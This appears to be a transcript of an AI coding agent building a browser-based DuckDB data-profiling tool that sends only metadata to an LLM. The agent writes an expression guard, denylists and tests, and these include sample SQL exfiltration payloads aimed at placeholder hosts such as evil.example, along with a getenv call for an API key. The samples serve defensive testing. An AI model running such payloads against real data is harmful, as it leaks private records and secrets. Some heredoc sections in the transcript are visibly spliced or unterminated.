next 16.3.4  react/react-dom 19.2.8  tailwindcss 4.3.3
@duckdb/duckdb-wasm 1.33.1-dev57.0   apache-arrow 17.0.0 (EXACT)
@anthropic-ai/sdk 0.124.0  hono 4.13.7  zod 4.5.4
wrangler 4.129.1  @cloudflare/workers-types  vitest 5.0.0  concurrently 10.0.5
```

Dropped from the earlier plan as "extra stuff": shadcn/ui, CodeMirror, TanStack Table/Virtual,
zustand, SSE streaming, the chat pane, the standalone SQL editor.

---

## Flow

```
  URL or file
      │
      ▼
  ① VALIDATE ── ranged GET: CORS? ranges? size? magic bytes match extension?
      │
      ▼
  ② LOAD ────── CREATE TABLE t AS SELECT * FROM <source>
      │         then SET enable_external_access=false   ◀── hard exfiltration guard
      ▼
  ③ PROFILE ─── chunked aggregates → TableProfile (metadata only)
      │
      ▼         POST /api/hypotheses  { profile }
  ④ HYPOTHESIZE ──────────▶ Worker ──▶ claude-sonnet-5 (structured output)
      │         ◀────────── Hypothesis[]
      ▼
  ⑤ EVALUATE ── guard each expression, run locally, count violations
      │
      ▼
  ✓ HOLDS / ✗ FALSIFIED (n rows, x%)  → click to see violating rows, locally
```

## ① URL validation

`lib/sources/validate.ts` runs a **ranged GET** (`Range: bytes=0-1023`) rather than HEAD — many
object stores don't allow HEAD under CORS, and one request tests CORS, range support, size, and
content sniffing at once.

Returns a per-check `ValidationReport` rendered as a checklist:

| Check | How |
|---|---|
| reachable / CORS | fetch succeeds. On `TypeError`, retry `mode:'no-cors'` — if *that* succeeds the host is up and it's a CORS problem specifically; report the distinction honestly, since the browser will not tell us directly. |
| range support | `206` → ranges; `200` → whole-file download, warn |
| size | `content-range` total or `content-length` |
| format | extension guess **cross-checked against magic bytes**: Parquet starts `PAR1`; JSON starts `{`/`[`; otherwise delimiter heuristics for CSV/TSV. Mismatch is reported, not silently accepted. |

## ② Load + the exfiltration guard

Model-authored SQL runs against the user's data, so `read_csv('https://evil/?d='||email)` is a real
exfiltration path that would break the product's central promise. Two layers:

1. **Materialize, then disable external access.** `CREATE TABLE t AS SELECT * FROM <source>`, then
   `SET enable_external_access=false` before any generated SQL runs. (Verify empirically in
   duckdb-wasm that this sticks and cannot be re-enabled.) Trade-off: the file is held in memory
   rather than range-read lazily; acceptable for an in-browser tool, and noted as a seam.
2. **No raw SQL from the model at all** — see ④.

## ③ Profile — the only thing that crosses the network

`lib/profile/types.ts`. Every field is a number, a column name, a SQL type name, or a derived
shape string.

- always: `name, ordinal, sqlType, class, rowCount, nullCount, nullPct, approxDistinct,
  distinctPct, isCandidateKey`
- `numeric`: min, max, avg, stddev, p01/p25/p50/p75/p99, zeroCount, negativeCount, nonFiniteCount
- `temporal`: minISO, maxISO, spanDays, futureCount, epochZeroCount
  *(dates included deliberately — a 1970 min is the highest-value quality signal there is)*
- `boolean`: trueCount, falseCount
- `string`: length stats, emptyCount, whitespaceOnlyCount, untrimmedCount, char-class percentages,
  distinctCaseInsensitive, and **shape histograms — never values**. A shape is `aaaa9@aaa.aa`
  (letters→`a`/`A`, digits→`9`). DuckDB's RE2 has no backreferences, so runs can't be collapsed in
  SQL: compute the raw shape in SQL, `GROUP BY`, collapse runs in TypeScript on already-anonymized
  strings.

**Enforced, not just intended:** `lib/profile/redaction.ts#assertNoValues`, plus a vitest case that
profiles a fixture seeded with real-looking PII and asserts none of those literals appear in
`JSON.stringify(profile)`. Column *names* do cross the wire — inherent to the design.

Perf: one chunked aggregate query per ~25 columns (not per column); shape histograms only for
string columns, under `USING SAMPLE 50000 ROWS`, capped at ~20 columns.

## ④ Hypotheses

`POST /api/hypotheses { profile }` → Worker validates with zod, calls
`client.messages.parse({ model: 'claude-sonnet-5', max_tokens: 16000, output_config: { format:
zodOutputFormat(HypothesesSchema) } })`. `parsed_output` is `null` on parse failure — guard it.
The Worker owns the system prompt, schema, model and token cap; the client sends only a profile.

**The model never emits raw SQL.** It emits structured checks, so the FROM clause is always ours:

```ts
type Check =
  | { kind: 'row_predicate'; expression: string }   // must be true for every row
  | { kind: 'unique'; columns: string[] }

interface Hypothesis {
  id: string; title: string; rationale: string;
  columns: string[]; severity: 'high' | 'medium' | 'low';
  check: Check;
}
```

`lib/hypotheses/guard.ts` rejects any expression containing `select`, `;`, `--`, `/*`, or a
`read_*`/`http`/`attach`/`copy`/`install`/`load` identifier — banning the `select` keyword kills
subquery-based exfiltration outright, and row predicates never need one. Surviving expressions are
parse-checked with `SELECT <expr> FROM t LIMIT 0` before use.

Evaluation:
- `row_predicate` → `SELECT count(*) AS violations FROM t WHERE NOT coalesce((<expr>), true)`
  (a NULL predicate passes)
- `unique` → `SELECT count(*) AS violations FROM (SELECT 1 FROM t GROUP BY <cols> HAVING count(*)>1)`
- view violations → same WHERE, `LIMIT 200`, rendered locally, never sent

Expressions that fail the guard or fail to parse are listed as "not evaluated" with the reason —
no repair round in v1.

## File layout

```
duck-invariant/
├─ next.config.ts        output:'export'
├─ wrangler.jsonc        main worker/index.ts, assets ./out, run_worker_first ["/api/*"]
├─ .dev.vars             ANTHROPIC_API_KEY (gitignored)
├─ app/                  layout.tsx  page.tsx  globals.css
├─ components/           SourceInput  ValidationChecklist  TableSummary
│                        HypothesisList  ViolationTable
├─ lib/
│  ├─ duckdb/            bundles.ts (THE swappable module)  client.ts  load.ts
│  ├─ sources/           validate.ts
│  ├─ profile/           types.ts queries.ts profile.ts shapes.ts redaction.ts
│  ├─ hypotheses/        schema.ts (shared w/ worker)  guard.ts  evaluate.ts
│  └─ api.ts
├─ worker/index.ts       Hono: /api/health, /api/hypotheses
└─ test/
```

Dev: `rewrites` are unsupported under `output: 'export'`, so `NEXT_PUBLIC_API_BASE`
(`http://127.0.0.1:8787` in dev, `''` in prod) + Hono `cors()` gated on a dev flag.
`npm run dev` = `next dev` + `wrangler dev` via `concurrently`.

## Verification

1. `npm test` — profile SQL against a fixture via duckdb-wasm's **Node** build (same SQL the
   browser runs); shape collapsing; the guard's denylist (including attempted exfiltration
   expressions); the PII-leak assertion; Worker routes via Hono `app.request()`.
2. `npm run dev` → validate + load the TPC-H lineitem parquet, confirm the checklist, profile,
   and a real hypothesis run.
3. Point at a non-CORS URL and a `.parquet` URL that isn't parquet; confirm both fail clearly.
4. **Inspect the `/api/hypotheses` request body in the network tab** — no cell values. This is the
   product's central claim; verify by eye, not only in unit tests.
5. Chrome MCP screenshot of the running app.
6. Deploy; confirm unauthenticated curl to `/api/hypotheses` gets Access's login redirect.

## Risks

| Risk | Handling |
|---|---|
| Turbopack + duckdb-wasm/Arrow interop | #1 build risk. Client-only dynamic import; fall back to `transpilePackages`. Surfaced early. |
| `enable_external_access=false` may not behave as hoped in wasm | Verify empirically in phase 2; the expression guard is the primary defence, this is defence in depth. |
| `typescript@7.0.2` is `latest` (Go compiler) | Take whatever `create-next-app` pins; drop to 5.9.x if the toolchain chokes. |
| 34 MiB wasm (~10 MB brotli) first load | Loading state with progress; R2 + immutable cache later. |
| Materializing large files into memory | Warn above ~500 MB at validation time; lazy range-read mode is a documented seam. |

## Seams left open (not built)

SQL editor, R2 wasm hosting, session persistence, hypothesis repair round, multi-table joins.

## Prerequisites from you

`wrangler login` (run `! wrangler login`), an Anthropic API key for `.dev.vars`, Zero Trust
enabled for the Access step.

Assistant2026-09-08T00:28:53.757Z
$ Bash
Write profile types and typecheck
mkdir -p lib/profile lib/duckdb lib/sources lib/hypotheses worker components test

cat > lib/profile/types.ts <<'EOF'
import { z } from "zod";

/**
 * The profile is the ONLY thing that ever leaves the browser.
 *
 * Every field here is a number, a column name, a SQL type name, or a derived
 * shape string. There are deliberately no cell values: no string min/max, no
 * top-k values, no row samples. See lib/profile/redaction.ts for the assertion
 * that enforces this, and test/redaction.test.ts for the proof.
 *
 * These zod schemas are shared with the Worker, which re-parses the incoming
 * profile. Because zod strips unknown keys, a client that tried to smuggle
 * extra fields through would have them dropped before reaching Anthropic.
 */

export const COLUMN_CLASSES = [
  "numeric",
  "temporal",
  "boolean",
  "string",
  "nested",
  "other",
] as const;

export const ColumnClassSchema = z.enum(COLUMN_CLASSES);
export type ColumnClass = z.infer<typeof ColumnClassSchema>;

const num = z.number().nullable();

export const NumericStatsSchema = z.object({
  min: num,
  max: num,
  avg: num,
  stddev: num,
  p01: num,
  p25: num,
  p50: num,
  p75: num,
  p99: num,
  zeroCount: z.number(),
  negativeCount: z.number(),
  nonFiniteCount: z.number(),
});

export const TemporalStatsSchema = z.object({
  /** ISO-8601. Dates are included deliberately: a 1970 min or a year-3000 max
   *  is the single highest-value data-quality signal in most datasets. */
  minISO: z.string().nullable(),
  maxISO: z.string().nullable(),
  spanDays: num,
  futureCount: z.number(),
  epochZeroCount: z.number(),
});

export const BooleanStatsSchema = z.object({
  trueCount: z.number(),
  falseCount: z.number(),
});

export const CharClassPctSchema = z.object({
  alpha: z.number(),
  digit: z.number(),
  space: z.number(),
  punct: z.number(),
  other: z.number(),
});

/** A shape is a value with every letter mapped to a/A and every digit to 9,
 *  e.g. "aaaa9@aaa.aa". Non-reversible; carries format, never content. */
export const ShapeSchema = z.object({
  shape: z.string(),
  count: z.number(),
});

export const StringStatsSchema = z.object({
  lenMin: num,
  lenP50: num,
  lenMax: num,
  lenAvg: num,
  emptyCount: z.number(),
  whitespaceOnlyCount: z.number(),
  untrimmedCount: z.number(),
  charClassPct: CharClassPctSchema,
  /** Distinct count ignoring case. Much lower than approxDistinct means the
   *  column mixes casing for the same logical value. */
  distinctCaseInsensitive: z.number().nullable(),
  shapes: z.array(ShapeSchema),
});

export const ColumnProfileSchema = z.object({
  name: z.string(),
  ordinal: z.number(),
  sqlType: z.string(),
  class: ColumnClassSchema,
  rowCount: z.number(),
  nullCount: z.number(),
  nullPct: z.number(),
  approxDistinct: z.number(),
  distinctPct: z.number(),
  isCandidateKey: z.boolean(),
  numeric: NumericStatsSchema.nullable(),
  temporal: TemporalStatsSchema.nullable(),
  boolean: BooleanStatsSchema.nullable(),
  string: StringStatsSchema.nullable(),
});

export const TableProfileSchema = z.object({
  table: z.string(),
  format: z.enum(["parquet", "csv", "json"]),
  rowCount: z.number(),
  columnCount: z.number(),
  profileMs: z.number(),
  columns: z.array(ColumnProfileSchema),
});

export type NumericStats = z.infer<typeof NumericStatsSchema>;
export type TemporalStats = z.infer<typeof TemporalStatsSchema>;
export type BooleanStats = z.infer<typeof BooleanStatsSchema>;
export type StringStats = z.infer<typeof StringStatsSchema>;
export type ColumnProfile = z.infer<typeof ColumnProfileSchema>;
export type TableProfile = z.infer<typeof TableProfileSchema>;
EOF

$ Bash
Write hypothesis schema
cd /Users/dj/workspace/duck-invariant

cat > lib/hypotheses/schema.ts <<'EOF'
import { z } from "zod";

/**
 * The hypothesis contract, shared by the Worker (which asks Claude for these)
 * and the browser (which evaluates them).
 *
 * Claude never emits raw SQL. It emits a structured *check*, so the FROM clause
 * is always ours and the result shape is always a violation count. That closes
 * the obvious exfiltration hole, where a generated query could smuggle data out
 * via something like read_csv('https://evil/?d=' || email).
 *
 * WIRE FORMAT NOTE: the wire schema is flat (every field required, unused ones
 * empty) rather than a discriminated union, because strict structured-output
 * JSON Schema wants all properties present and required. We normalise it into a
 * proper discriminated union the moment it arrives.
 */

export const SEVERITIES = ["high", "medium", "low"] as const;
export const SeveritySchema = z.enum(SEVERITIES);
export type Severity = z.infer<typeof SeveritySchema>;

export const CHECK_KINDS = ["row_predicate", "unique"] as const;

export const WireHypothesisSchema = z.object({
  title: z
    .string()
    .describe(
      "A short, falsifiable claim stated as fact, e.g. 'discount is between 0 and 1'.",
    ),
  rationale: z
    .string()
    .describe(
      "One or two sentences citing the specific profile statistics that motivated this hypothesis.",
    ),
  columns: z.array(z.string()).describe("Column names this hypothesis concerns."),
  severity: SeveritySchema.describe(
    "How damaging it would be if this turned out to be false.",
  ),
  kind: z
    .enum(CHECK_KINDS)
    .describe(
      "'row_predicate' for a boolean expression that must hold on every row; 'unique' to assert a column set has no duplicates.",
    ),
  expression: z
    .string()
    .describe(
      "For kind='row_predicate': a DuckDB boolean expression over this table's columns that must be TRUE for every row, e.g. \"discount >= 0 AND discount <= 1\". Must not contain SELECT, subqueries, semicolons, comments, or any function that reads a file or URL. Empty string when kind='unique'.",
    ),
  unique_columns: z
    .array(z.string())
    .describe(
      "For kind='unique': the columns that together should be unique. Empty array when kind='row_predicate'.",
    ),
});

export const WireHypothesesSchema = z.object({
  hypotheses: z.array(WireHypothesisSchema),
});

export type WireHypothesis = z.infer<typeof WireHypothesisSchema>;
export type WireHypotheses = z.infer<typeof WireHypothesesSchema>;

/* ---------------------------------------------------------------- app types */

export type Check =
  | { kind: "row_predicate"; expression: string }
  | { kind: "unique"; columns: string[] };

export interface Hypothesis {
  id: string;
  title: string;
  rationale: string;
  columns: string[];
  severity: Severity;
  check: Check;
}

/** Outcome of evaluating one hypothesis locally against DuckDB. */
export type HypothesisResult =
  | { status: "holds"; violations: 0; rowCount: number; ms: number }
  | { status: "falsified"; violations: number; rowCount: number; pct: number; ms: number }
  | { status: "skipped"; reason: string };

/**
 * Turn the flat wire form into the discriminated union, dropping anything
 * malformed. Ids are assigned here so they are stable for React keys and are
 * never model-controlled.
 */
export function normalizeHypotheses(wire: WireHypotheses): Hypothesis[] {
  const out: Hypothesis[] = [];
  wire.hypotheses.forEach((h, i) => {
    const base = {
      id: `h${i + 1}`,
      title: h.title.trim(),
      rationale: h.rationale.trim(),
      columns: h.columns,
      severity: h.severity,
    };
    if (h.kind === "unique") {
      if (h.unique_columns.length === 0) return;
      out.push({ ...base, check: { kind: "unique", columns: h.unique_columns } });
    } else {
      if (h.expression.trim() === "") return;
      out.push({
        ...base,
        check: { kind: "row_predicate", expression: h.expression.trim() },
      });
    }
  });
  return out;
}
EOF

exit=0

Now the security-critical piece — the expression guard:

Assistant2026-09-08T00:30:04.526Z
$ Bash
Write expression guard
cd /Users/dj/workspace/duck-invariant

cat > lib/hypotheses/guard.ts <<'EOF'
/**
 * Validation for model-authored SQL expressions.
 *
 * This is the security boundary of the product. The whole promise is that no
 * cell value leaves the browser, and we execute SQL that a language model
 * wrote, so an expression like
 *
 *     read_csv('https://evil.example/?leak=' || customer_email)
 *
 * would quietly break that promise. Row predicates never need subqueries, so
 * banning the SELECT keyword outright removes the entire class of attack, and a
 * function denylist covers the table functions that can reach a file or URL.
 *
 * This runs *before* DuckDB sees the string, and it is backed by
 * `SET enable_external_access=false` at load time as defence in depth.
 */

const MAX_EXPRESSION_LENGTH = 1000;

/** Keywords a boolean row predicate has no legitimate use for. */
const BANNED_KEYWORDS = new Set([
  "select", "from", "where", "join", "union", "intersect", "except", "with",
  "insert", "update", "delete", "merge", "drop", "create", "alter", "truncate",
  "attach", "detach", "copy", "install", "load", "pragma", "set", "reset",
  "call", "export", "import", "checkpoint", "vacuum", "analyze", "explain",
  "prepare", "execute", "deallocate", "describe", "summarize", "pivot",
  "unpivot", "grant", "revoke", "begin", "commit", "rollback",
]);

/** Functions that can reach a file, a URL, or the host environment. */
const BANNED_FUNCTIONS = new Set([
  "glob", "getenv", "shell", "system", "query", "query_table", "sniff_csv",
  "sql_auto_complete", "duckdb_settings", "duckdb_extensions", "which_secret",
  "current_setting", "gen_random_uuid_v7",
]);

/** Any identifier starting or ending with one of these is refused outright. */
const BANNED_PREFIXES = ["read_", "scan_", "parquet_", "iceberg_", "delta_", "postgres_", "sqlite_", "mysql_"];
const BANNED_SUFFIXES = ["_scan", "_replacement_scan"];

export type GuardResult =
  | { ok: true; expression: string }
  | { ok: false; reason: string };

/**
 * Replace string literals and quoted identifiers with inert placeholders so the
 * keyword scan cannot be fooled by, or trip over, their contents. A banned word
 * inside a literal is harmless — DuckDB never evaluates a string as SQL — and a
 * column legitimately named "from" must not fail the check.
 */
function stripQuoted(sql: string): string {
  return sql
    .replace(/'(?:[^']|'')*'/g, " 'str' ")
    .replace(/"(?:[^"]|"")*"/g, " ident ");
}

export function guardExpression(raw: string): GuardResult {
  const expression = raw.trim();

  if (expression === "") return { ok: false, reason: "Empty expression." };
  if (expression.length > MAX_EXPRESSION_LENGTH) {
    return { ok: false, reason: `Expression longer than ${MAX_EXPRESSION_LENGTH} characters.` };
  }

  const stripped = stripQuoted(expression);

  if (stripped.includes(";")) {
    return { ok: false, reason: "Statement separator (;) is not allowed." };
  }
  for (const marker of ["--", "/*", "*/", "$$"]) {
    if (stripped.includes(marker)) {
      return { ok: false, reason: `Comment or dollar-quote marker (${marker}) is not allowed.` };
    }
  }

  // Unbalanced parentheses usually mean the model tried to close our wrapper.
  let depth = 0;
  for (const ch of stripped) {
    if (ch === "(") depth++;
    else if (ch === ")") depth--;
    if (depth < 0) return { ok: false, reason: "Unbalanced parentheses." };
  }
  if (depth !== 0) return { ok: false, reason: "Unbalanced parentheses." };

  for (const token of stripped.toLowerCase().match(/[a-z_][a-z0-9_]*/g) ?? []) {
    if (BANNED_KEYWORDS.has(token)) {
      return { ok: false, reason: `Keyword "${token}" is not allowed in a row predicate.` };
    }
    if (BANNED_FUNCTIONS.has(token)) {
      return { ok: false, reason: `Function "${token}" is not allowed.` };
    }
    for (const prefix of BANNED_PREFIXES) {
      if (token.startsWith(prefix)) {
        return { ok: false, reason: `Identifier "${token}" can read external data.` };
      }
    }
    for (const suffix of BANNED_SUFFIXES) {
      if (token.endsWith(suffix)) {
        return { ok: false, reason: `Identifier "${token}" can read external data.` };
      }
    }
  }

  return { ok: true, expression };
}

/** Quote an identifier for DuckDB, escaping embedded double quotes. */
export function quoteIdent(name: string): string {
  return `"${name.replace(/"/g, '""')}"`;
}

/**
 * Column names for a `unique` check are matched against the real schema rather
 * than guarded heuristically — an exact match against known columns is a
 * stronger check than any denylist.
 */
export function guardColumns(columns: string[], known: string[]): GuardResult | { ok: true; columns: string[] } {
  if (columns.length === 0) return { ok: false, reason: "No columns given." };
  const knownSet = new Set(known);
  const unknown = columns.filter((c) => !knownSet.has(c));
  if (unknown.length > 0) {
    return { ok: false, reason: `Unknown column(s): ${unknown.join(", ")}.` };
  }
  return { ok: true, columns };
}
EOF

import { describe, it, expect } from "vitest";
import { guardExpression, guardColumns, quoteIdent } from "@/lib/hypotheses/guard";

describe("guardExpression", () => {
  it("accepts ordinary row predicates", () => {
    const good = [
      "discount >= 0 AND discount <= 1",
      "l_shipdate >= l_orderdate",
      "amount IS NOT NULL",
      "status IN ('settled', 'pending', 'void')",
      "length(trim(email)) > 0",
      "coalesce(qty, 0) >= 0",
      "regexp_matches(code, '^[A-Z]{3}-[0-9]+$')",
      'CAST("order id" AS BIGINT) > 0',
    ];
    for (const expr of good) {
      expect(guardExpression(expr), expr).toMatchObject({ ok: true });
    }
  });

  it("blocks data exfiltration through table functions", () => {
    const attacks = [
      "read_csv('https://evil.example/?d=' || customer_email) IS NOT NULL",
      "(SELECT count(*) FROM read_parquet('https://evil/x')) > 0",
      "amount > (SELECT max(salary) FROM employees)",
      "parquet_scan('s3://leak/' || ssn) IS NULL",
      "x > 0; ATTACH 'https://evil/db'",
      "x > 0 -- ' OR read_csv('http://evil')",
      "x > 0 /* smuggle */ AND glob('/etc/*') IS NULL",
      "getenv('ANTHROPIC_API_KEY') IS NULL",
    ];
    for (const expr of attacks) {
      expect(guardExpression(expr), expr).toMatchObject({ ok: false });
    }
  });

  it("does not trip over banned words inside string literals", () => {
    // A literal can never execute, so this must be allowed through.
    const r = guardExpression("note = 'please select from the menu'");
    expect(r).toMatchObject({ ok: true });
  });

  it("allows a column legitimately named like a keyword when quoted", () => {
    expect(guardExpression('"from" IS NOT NULL')).toMatchObject({ ok: true });
    expect(guardExpression('"select" > 0')).toMatchObject({ ok: true });
  });

  it("rejects empty, oversized, and unbalanced expressions", () => {
    expect(guardExpression("   ")).toMatchObject({ ok: false });
    expect(guardExpression("x".repeat(1001) + " > 0")).toMatchObject({ ok: false });
    expect(guardExpression("(a > 0")).toMatchObject({ ok: false });
    expect(guardExpression("a > 0)")).toMatchObject({ ok: false });
  });
});

describe("guardColumns", () => {
  it("accepts known columns and rejects unknown ones", () => {
    expect(guardColumns(["a", "b"], ["a", "b", "c"])).toMatchObject({ ok: true });
    expect(guardColumns(["a", "zzz"], ["a", "b"])).toMatchObject({ ok: false });
    expect(guardColumns([], ["a"])).toMatchObject({ ok: false });
  });
});

describe("quoteIdent", () => {
  it("escapes embedded double quotes", () => {
    expect(quoteIdent("plain")).toBe('"plain"');
    expect(quoteIdent('we"ird')).toBe('"we""ird"');
  });
});
EOF

/** Bundles have different characteristics:

cat > lib/duckdb/bundles.ts <<'EOF'
import * as duckdb from "@duckdb/duckdb-wasm";

/**
 * The only file that knows where the DuckDB WebAssembly binary comes from.
 *
 * It cannot be served from Cloudflare Workers static assets: duckdb-eh.wasm is
 * 34 MiB and the per-file asset limit is 25 MiB. So it comes from jsDelivr
 * (~10 MB brotli-compressed over the wire, then cached by the browser).
 *
 * To self-host from R2 later, upload duckdb-eh.wasm, duckdb-mvp.wasm and their
 * matching worker scripts to a bucket and set NEXT_PUBLIC_DUCKDB_BASE_URL.
 * Nothing else in the codebase changes.
 */
function selfHostedBundles(base: string): duckdb.DuckDBBundles {
  return {
    mvp: {
      mainModule: `${base}/duckdb-mvp.wasm`,
      mainWorker: `${base}/duckdb-browser-mvp.worker.js`,
    },
    eh: {
      mainModule: `${base}/duckdb-eh.wasm`,
      mainWorker: `${base}/duckdb-browser-eh.worker.js`,
    },
    // `coi` is deliberately omitted. The threaded build requires site-wide
    // cross-origin isolation (COOP/COEP), which we do not enable.
  };
}

export async function resolveBundle(): Promise<duckdb.DuckDBBundle> {
  const base = process.env.NEXT_PUBLIC_DUCKDB_BASE_URL?.replace(/\/$/, "");
  const bundles = base ? selfHostedBundles(base) : duckdb.getJsDelivrBundles();
  return duckdb.selectBundle(bundles);
}
EOF

cat > lib/duckdb/client.ts <<'EOF'
import * as duckdb from "@duckdb/duckdb-wasm";
import { resolveBundle } from "./bundles";

export interface BootProgress {
  bytesLoaded: number;
  bytesTotal: number;
}

let dbPromise: Promise<duckdb.AsyncDuckDB> | null = null;

/**
 * Boot DuckDB once per page. The engine runs in its own Web Worker, so queries
 * never block the UI thread.
 *
 * The worker script is loaded through a Blob URL because `new Worker(crossOriginUrl)`
 * is forbidden; importScripts inside a same-origin blob is the standard
 * duckdb-wasm workaround for CDN-hosted bundles.
 */
export function getDuckDB(
  onProgress?: (p: BootProgress) => void,
): Promise<duckdb.AsyncDuckDB> {
  if (dbPromise) return dbPromise;

  dbPromise = (async () => {
    const bundle = await resolveBundle();

    const workerUrl = URL.createObjectURL(
      new Blob([`importScripts("${bundle.mainWorker!}");`], {
        type: "text/javascript",
      }),
    );

    try {
      const worker = new Worker(workerUrl);
      const db = new duckdb.AsyncDuckDB(new duckdb.VoidLogger(), worker);
      await db.instantiate(bundle.mainModule, bundle.pthreadWorker, (p) =>
        onProgress?.({ bytesLoaded: p.bytesLoaded, bytesTotal: p.bytesTotal }),
      );
      return db;
    } catch (err) {
      dbPromise = null; // let the next attempt retry from scratch
      throw err;
    } finally {
      URL.revokeObjectURL(workerUrl);
    }
  })();

  return dbPromise;
}
EOF

Write URL validation
cd /Users/dj/workspace/duck-invariant

cat > lib/sources/validate.ts <<'EOF'
export type SourceFormat = "parquet" | "csv" | "json";

export type CheckStatus = "pass" | "warn" | "fail";

export interface SourceCheck {
  id: string;
  label: string;
  status: CheckStatus;
  detail: string;
}

export interface ValidationReport {
  ok: boolean;
  url: string;
  format: SourceFormat | null;
  sizeBytes: number | null;
  supportsRanges: boolean;
  checks: SourceCheck[];
}

/** Warn above this, since the file is materialised into browser memory. */
const LARGE_FILE_BYTES = 500 * 1024 * 1024;

const EXTENSION_FORMATS: Record<string, SourceFormat> = {
  parquet: "parquet",
  pq: "parquet",
  csv: "csv",
  tsv: "csv",
  txt: "csv",
  json: "json",
  ndjson: "json",
  jsonl: "json",
};

export function formatFromExtension(pathname: string): SourceFormat | null {
  const ext = pathname.split(".").pop()?.toLowerCase() ?? "";
  return EXTENSION_FORMATS[ext] ?? null;
}

/**
 * Identify the format from the first bytes of the file rather than trusting the
 * extension. Parquet has a real magic number; JSON and CSV are inferred from
 * the first non-whitespace character and general text-ness.
 */
export function sniffFormat(head: Uint8Array): SourceFormat | null {
  if (head.length >= 4) {
    // Every Parquet file begins (and ends) with the ASCII bytes "PAR1".
    if (head[0] === 0x50 && head[1] === 0x41 && head[2] === 0x52 && head[3] === 0x31) {
      return "parquet";
    }
  }

  // Anything with NUL bytes in the first KB is binary, and not a format we read.
  if (head.subarray(0, 512).includes(0x00)) return null;

  const text = new TextDecoder("utf-8", { fatal: false }).decode(head).trimStart();
  if (text === "") return null;
  if (text[0] === "{" || text[0] === "[") return "json";

  const firstLine = text.split(/\r?\n/, 1)[0] ?? "";
  if (/[,;\t|]/.test(firstLine)) return "csv";
  return null;
}

export function formatBytes(n: number | null): string {
  if (n === null) return "unknown size";
  if (n < 1024) return `${n} B`;
  const units = ["KB", "MB", "GB", "TB"];
  let v = n / 1024;
  let i = 0;
  while (v >= 1024 && i < units.length - 1) {
    v /= 1024;
    i++;
  }
  return `${v.toFixed(v < 10 ? 1 : 0)} ${units[i]}`;
}

/**
 * Preflight a data URL before we try to load it.
 *
 * Uses a ranged GET rather than HEAD: many object stores reject HEAD under CORS,
 * and one ranged request simultaneously tests reachability, CORS, range support,
 * size and file contents.
 */
export async function validateSource(rawUrl: string): Promise<ValidationReport> {
  const checks: SourceCheck[] = [];
  const fail = (report: Partial<ValidationReport> = {}): ValidationReport => ({
    ok: false,
    url: rawUrl,
    format: null,
    sizeBytes: null,
    supportsRanges: false,
    checks,
    ...report,
  });

  let url: URL;
  try {
    url = new URL(rawUrl);
  } catch {
    checks.push({
      id: "url",
      label: "Valid URL",
      status: "fail",
      detail: "That is not a URL. It should start with https://",
    });
    return fail();
  }

  if (url.protocol !== "https:" && url.protocol !== "http:") {
    checks.push({
      id: "url",
      label: "Valid URL",
      status: "fail",
      detail: `Unsupported scheme "${url.protocol}". Use http or https.`,
    });
    return fail();
  }
  checks.push({ id: "url", label: "Valid URL", status: "pass", detail: url.host });

  let res: Response;
  try {
    res = await fetch(url, { headers: { Range: "bytes=0-1023" }, mode: "cors" });
  } catch {
    // The browser refuses to tell us whether this was a CORS rejection or a dead
    // host, so probe again without CORS to work out which and say so honestly.
    let hostReachable = false;
    try {
      await fetch(url, { mode: "no-cors" });
      hostReachable = true;
    } catch {
      /* still unreachable */
    }
    checks.push(
      hostReachable
        ? {
            id: "cors",
            label: "CORS accessible",
            status: "fail",
            detail:
              "The server is reachable but refuses cross-origin reads. It needs to send an Access-Control-Allow-Origin header.",
          }
        : {
            id: "cors",
            label: "Reachable",
            status: "fail",
            detail: "Could not reach the URL. Check the address and your connection.",
          },
    );
    return fail();
  }

  if (!res.ok && res.status !== 206) {
    checks.push({
      id: "cors",
      label: "Reachable",
      status: "fail",
      detail: `Server responded ${res.status} ${res.statusText}.`,
    });
    return fail();
  }
  checks.push({
    id: "cors",
    label: "CORS accessible",
    status: "pass",
    detail: "Cross-origin read allowed.",
  });

  const supportsRanges = res.status === 206;
  checks.push(
    supportsRanges
      ? {
          id: "ranges",
          label: "Range requests",
          status: "pass",
          detail: "Server supports partial reads.",
        }
      : {
          id: "ranges",
          label: "Range requests",
          status: "warn",
          detail: "Not supported — the whole file will be downloaded.",
        },
  );

  // Content-Range and Accept-Ranges are not CORS-safelisted, so they are often
  // invisible to us even when the server sent them. Report unknown, never guess.
  let sizeBytes: number | null = null;
  const contentRange = res.headers.get("content-range");
  const contentLength = res.headers.get("content-length");
  if (contentRange) {
    const total = Number(contentRange.split("/")[1]);
    if (Number.isFinite(total)) sizeBytes = total;
  } else if (!supportsRanges && contentLength) {
    const total = Number(contentLength);
    if (Number.isFinite(total)) sizeBytes = total;
  }

  if (sizeBytes !== null && sizeBytes > LARGE_FILE_BYTES) {
    checks.push({
      id: "size",
      label: "Size",
      status: "warn",
      detail: `${formatBytes(sizeBytes)} — large files are held in browser memory and may be slow.`,
    });
  } else {
    checks.push({
      id: "size",
      label: "Size",
      status: "pass",
      detail:
        sizeBytes === null
          ? "Not reported by the server (headers not exposed to the browser)."
          : formatBytes(sizeBytes),
    });
  }

  const head = new Uint8Array(await res.arrayBuffer());
  const sniffed = sniffFormat(head);
  const declared = formatFromExtension(url.pathname);
  const format = sniffed ?? declared;

  if (format === null) {
    checks.push({
      id: "format",
      label: "Recognised format",
      status: "fail",
      detail: "Not Parquet, CSV or JSON as far as we can tell.",
    });
    return fail({ supportsRanges, sizeBytes });
  }

  if (sniffed && declared && sniffed !== declared) {
    checks.push({
      id: "format",
      label: "Recognised format",
      status: "warn",
      detail: `Named .${url.pathname.split(".").pop()} but the contents look like ${sniffed}. Reading it as ${sniffed}.`,
    });
  } else {
    checks.push({
      id: "format",
      label: "Recognised format",
      status: "pass",
      detail: sniffed
        ? `${sniffed} (confirmed from file contents)`
        : `${format} (from the file extension)`,
    });
  }

  return { ok: true, url: rawUrl, format, sizeBytes, supportsRanges, checks };
}

Write Arrow conversion helpers

cat > lib/arrow.ts <<'EOF'
import type * as arrow from "apache-arrow";

/**
 * DuckDB hands back Arrow. Two things bite when reading it from JS:
 * INT64 columns arrive as BigInt (which JSON.stringify throws on), and
 * temporal columns arrive as numbers or Dates depending on the unit.
 * Everything crossing into plain JS goes through here.
 */
export function toJs(value: unknown): unknown {
  if (value === null || value === undefined) return null;
  if (typeof value === "bigint") {
    // Counts and sums exceeding 2^53 are not realistic here, and a Number is
    // far easier to work with downstream than a BigInt.
    return Number.isSafeInteger(Number(value)) ? Number(value) : value.toString();
  }
  if (value instanceof Date) return value.toISOString();
  if (ArrayBuffer.isView(value)) return Array.from(value as unknown as ArrayLike<number>);
  if (Array.isArray(value)) return value.map(toJs);
